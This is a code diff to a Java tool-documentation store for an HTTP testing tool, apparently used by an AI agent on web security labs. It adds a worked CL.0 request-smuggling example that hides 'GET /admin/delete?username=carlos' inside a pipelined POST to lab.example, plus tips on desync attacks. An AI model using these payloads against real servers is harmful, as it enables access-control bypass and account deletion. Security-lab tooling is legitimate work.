@@ -516,6 +516,17 @@ public class ToolDocumentationStore {
                         "raw_request", true),
                     "output", Map.of("status_code", 200, "body", "admin panel HTML"),
                     "explanation", "raw_request=true sends bytes verbatim — the absolute-URI request line is preserved on the wire (no rewrite to origin-form), so front-end and back-end can disagree on routing."
+                ),
+                Map.of(
+                    "title", "CL.0 request smuggling (SEND_PIPELINED on one TLS socket)",
+                    "input", Map.of("action", "SEND_PIPELINED",
+                        "requests", List.of(
+                            "POST /vulnerable HTTP/1.1\\r\\nHost: lab.example\\r\\nContent-Type: text/plain\\r\\nContent-Length: 50\\r\\nConnection: keep-alive\\r\\n\\r\\nGET /admin/delete?username=carlos HTTP/1.1\\r\\nFoo: x",
+                            "GET / HTTP/1.1\\r\\nHost: lab.example\\r\\nConnection: close\\r\\n\\r\\n"),
+                        "target_host", "lab.example",
+                        "target_port", 443),
+                    "output", Map.of("responses", "[{status_code:200,...},{status_code:302,...}]", "trailing_bytes_length", 0),
+                    "explanation", "Two requests on ONE TCP/TLS connection — the back-end interprets the smuggled GET in request 1's body. Required for CL.0/TE.CL/CL.TE/TE.0/0.CL and connection-state attacks; SEND_REQUEST/SEND_PARALLEL open separate sockets and cannot trigger the desync."
                 )
             ),
             List.of(
@@ -527,7 +538,9 @@ public class ToolDocumentationStore {
                 "Use raw_request=true to preserve absolute-URI request lines verbatim (parser-discrepancy / request-smuggling)",
                 "SEND_PARALLEL defaults to max_concurrency=10 (prevents silent tail-of-batch drops); pass 50 for race conditions",
                 "Use request_delay_ms to pace dispatch on rate-limited targets",
-                "SEND_PARALLEL responses come back in INPUT ORDER; .index field always matches the requests[] position"
+                "SEND_PARALLEL responses come back in INPUT ORDER; .index field always matches the requests[] position",
+                "SEND_PIPELINED writes 2-20 requests on ONE TLS socket — required for ALL request-smuggling labs (CL.0, TE.CL, etc.); SEND_REQUEST/SEND_PARALLEL open separate sockets and cannot trigger desync",
+                "SEND_PIPELINED responses include raw_bytes (base64) so callers can inspect malformed/smuggled responses the parser truncated"
             ));
 
         // burp_scanner with examples
